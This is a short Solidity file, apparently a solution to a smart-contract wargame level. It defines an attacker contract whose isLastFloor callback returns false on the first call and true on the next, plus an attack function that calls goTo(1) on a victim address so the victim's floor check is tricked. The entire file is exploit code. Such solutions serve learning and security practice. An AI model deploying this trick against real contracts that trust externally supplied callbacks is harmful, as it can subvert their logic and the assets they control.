// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Demolish is Building {
    bool public flag;

    function isLastFloor(uint) external returns(bool) {
        flag = !flag;
        return !flag;
    }

    function attack(address _victim) public {
       (bool success, ) = _victim.call(abi.encodeWithSignature("goTo(uint256)", 1));
        require(success);
    }
}